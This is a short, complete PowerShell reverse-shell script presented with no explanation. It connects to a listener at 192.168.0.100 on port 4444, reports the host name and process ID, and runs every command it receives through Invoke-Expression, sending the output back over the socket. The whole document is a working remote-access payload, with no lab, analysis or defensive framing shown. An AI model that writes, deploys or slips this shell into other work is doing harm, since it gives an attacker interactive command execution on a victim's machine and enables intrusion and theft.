$c=New-Object Net.Sockets.TCPClient("192.168.0.100",4444)
$s=$c.GetStream()
$w=New-Object IO.StreamWriter($s)
$r=New-Object IO.StreamReader($s)
$w.AutoFlush=$true
$w.WriteLine("[+] SYSTEM@$env:COMPUTERNAME | PID:$PID")
while($c.Connected){
    $w.Write("PS> ")
    $cmd=$r.ReadLine()
    if(!$cmd -or $cmd -eq "exit"){break}
    try{$o=iex $cmd 2>&1|Out-String}catch{$o=$_.ToString()}
    $w.WriteLine($o)
}
$c.Close()
